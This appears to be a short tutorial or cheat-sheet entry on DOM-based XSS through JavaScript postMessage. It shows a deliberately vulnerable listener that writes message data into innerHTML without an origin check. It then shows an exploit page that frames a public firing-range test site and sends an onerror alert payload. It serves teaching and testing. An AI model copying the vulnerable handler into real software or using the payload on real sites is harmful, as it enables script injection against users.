#### Post Message Function XSS example

Post message function in JS is used to enable communication between the page and the iframe inside it

Vulnerable code
```html
<html>
	<head><title>Toxic DOM</title></head>
	<body>
		<script>
			var postMessageHandler = function(msg) {
				var content = JSON.parse(msg.data);
				var div = document.createElement('div');
				div.innerHTML = content.html;
				document.documentElement.appendChild(div);
			};
			
			window.addEventListener('message', postMessageHandler, false);
		</script>
	</body>
</html>
```

(Exploitation) DOM XSS through postMessage example

```html
<html>
    <iframe id="target" src=""></iframe>
    <script>
        var target = document.getElementById("target");
        target.addEventListener("load", function () {
            var payload={
                html: "<img src=x onerror=alert(1)>"
            };
            target.contentWindow.postMessage(JSON.stringify(payload), "*");
        });
        target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml";
    </script>
</html>
```